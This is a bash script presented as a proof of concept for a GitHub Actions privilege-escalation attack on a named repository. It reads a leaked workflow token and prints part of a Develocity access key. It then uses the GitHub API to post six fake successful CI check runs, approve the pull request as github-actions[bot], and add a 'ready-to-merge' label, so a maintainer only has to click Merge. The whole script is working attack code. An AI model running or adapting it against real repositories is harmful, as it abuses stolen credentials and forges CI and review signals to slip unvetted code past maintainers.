#!/bin/bash
echo "========================================="
echo "  CRITICAL: Full Escalation PoC v3"
echo "  Attacker: treborlab → robertprast/beam"
echo "  Time: $(date -u)"
echo "========================================="

TOKEN="$GH_TOKEN_FOR_DISPATCH"
REPO="$GITHUB_REPOSITORY"

# Get the PR number from the event
PR_NUMBER=$(cat "$GITHUB_EVENT_PATH" | jq -r '.number // empty')
HEAD_SHA=$(cat "$GITHUB_EVENT_PATH" | jq -r '.pull_request.head.sha // empty')
echo "PR: #$PR_NUMBER  HEAD SHA: $HEAD_SHA"

echo ""
echo "=== Step 1: Secret Exfiltration ==="
echo "DEVELOCITY_ACCESS_KEY: ${DEVELOCITY_ACCESS_KEY:0:20}..."
echo "Token length: ${#TOKEN}"

echo ""
echo "=== Step 2: Creating fake green check runs ==="
# Create multiple fake check runs that look like real CI
for check_name in "PreCommit Python" "PreCommit Java" "PreCommit Go" "Code Coverage" "Security Scan" "License Check"; do
  result=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST \
    -H "Authorization: token $TOKEN" \
    -H "Accept: application/vnd.github.v3+json" \
    "https://api.github.com/repos/$REPO/check-runs" \
    -d "{
      \"name\": \"$check_name\",
      \"head_sha\": \"$HEAD_SHA\",
      \"status\": \"completed\",
      \"conclusion\": \"success\",
      \"output\": {
        \"title\": \"$check_name passed\",
        \"summary\": \"All checks passed successfully.\"
      }
    }")
  echo "  ✅ $check_name → HTTP $result"
done

echo ""
echo "=== Step 3: Approving the PR ==="
approve_result=$(curl -s -w "\n%{http_code}" \
  -X POST \
  -H "Authorization: token $TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  "https://api.github.com/repos/$REPO/pulls/$PR_NUMBER/reviews" \
  -d '{
    "event": "APPROVE",
    "body": "LGTM! All checks pass. Approved for merge."
  }')

HTTP_CODE=$(echo "$approve_result" | tail -1)
BODY=$(echo "$approve_result" | head -1)
echo "Approve HTTP: $HTTP_CODE"
echo "Review state: $(echo "$BODY" | jq -r '.state // .message' 2>/dev/null)"

echo ""
echo "=== Step 4: Adding 'ready-to-merge' label ==="
label_result=$(curl -s -o /dev/null -w "%{http_code}" \
  -X POST \
  -H "Authorization: token $TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  "https://api.github.com/repos/$REPO/issues/$PR_NUMBER/labels" \
  -d '{"labels":["ready-to-merge"]}')
echo "Label HTTP: $label_result"

echo ""
echo "========================================="
echo "  ESCALATION COMPLETE"
echo "  PR #$PR_NUMBER now has:"
echo "    - 6 green check runs"
echo "    - Approved review from github-actions[bot]"
echo "    - Ready-to-merge label"
echo "  A maintainer just needs to click Merge"
echo "========================================="
